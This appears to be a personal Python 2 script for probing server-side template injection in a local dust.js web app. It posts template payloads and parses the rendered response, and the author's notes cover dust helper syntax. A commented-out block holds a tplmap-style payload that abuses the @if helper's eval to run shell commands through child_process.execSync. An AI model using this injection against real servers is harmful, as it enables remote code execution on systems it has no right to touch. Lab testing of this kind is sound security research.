import requests
import re
import HTMLParser
import base64

def sendPayload(payload_arg="me"):
    url = "http://127.0.0.1:5065/"
    result1 = requests.post(url,data={"name":payload_arg}).text
    return result1

#tplmap exploit that is not working in new dustjs version, it used the if helper that contained one eval
'''
command_to_execute = "touch XXXXXXXXXXXXXxx"
command_b64_Encoded =base64.b64encode( command_to_execute )
jscode = "global.process.mainModule.require('child_process').execSync(Buffer('%s', 'base64').toString()"%command_b64_Encoded
jscode_b64 = base64.b64encode(jscode)
payload ="""{@if cond=\"eval(Buffer('%s', 'base64').toString())\"}{/if}"""%jscode
'''
payload ="{#1+1}"
payload ="{name}{len}"
resutl = sendPayload(payload)
try:
    regex = r"<p>Hello([\s\S]*)</p>"
    matches = re.findall(regex,resutl)
    print HTMLParser.HTMLParser().unescape(matches[0])
    print resutl
except:
    print "RESULT ERROR:\n"+resutl



''' Developing one exploit:
Whit normal tags i haven't been able to execute some simple code as 1+1. Reading the documentation at http://www.dustjs.com/docs/syntax/#reference I found {@helper/} "helper is a special kind of section that executes some JavaScript when it is rendered" example:
template -> The answer is {@eq key=answer value=42}42{:else}wrong{/eq}.
data -> { "answer": 42 }

{#appStatusOK}{/appStatusOK}
{#appStatusOK}
  Everything is awesome!
  {:gearsError}
    Gears are stopped! Status code: {gears.error}
  {:engineError}
    Engine is not running! Engine temperature: {engine.temperature}
  {:oilLevelError}
    Oil level is too low! Current level: {engine.oilLevel}
{/appStatusOK}


'''



